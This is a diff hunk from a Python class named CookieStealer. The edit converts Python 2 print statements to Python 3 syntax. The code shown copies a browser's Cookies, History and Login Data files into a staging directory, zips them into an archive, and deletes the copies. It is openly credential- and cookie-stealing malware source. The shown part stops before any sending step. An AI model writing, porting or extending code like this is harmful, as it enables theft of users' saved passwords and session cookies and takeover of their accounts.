@@ -20,36 +20,36 @@ class CookieStealer():
         filesindir = os.listdir(USERDATA_PATH)
         
         try:
-            print '[*] Copying cookies to path'
+            print ('[*] Copying cookies to path')
             if cookiefile not in filesindir:
                 shutil.copy2(cookiefile, USERDATA_PATH)
             if historyfile not in filesindir:
                 shutil.copy2(historyfile, USERDATA_PATH)
             if LoginDatafile not in filesindir:
                 shutil.copy2(LoginDatafile, USERDATA_PATH)
-            print '[*] Files copied'
+            print ('[*] Files copied')
             return True
         except Exception as e:
-            print '[*] Error in copying cookies'
-            print e
+            print ('[*] Error in copying cookies')
+            print (e)
             return False
 
 
     def zipAttachments(self):
-        print '[*] Zipping attachments'
+        print ('[*] Zipping attachments')
         arch_name = USERDATA_PATH + "CHL"
         files = ["Cookies", "History", "Login Data"]
         try:
             shutil.make_archive(arch_name, 'zip', USERDATA_PATH)
-            print '[*] Attachments zipped'
+            print ('[*] Attachments zipped')
         except Exception as e:
-            print '==> Error in making archive'
-            print e
+            print ('==> Error in making archive')
+            print (e)
         for file in files:
             try:
                 os.remove(USERDATA_PATH + file)
             except Exception as e:
-                print e
+                print (e)
     
     
     def run(self):
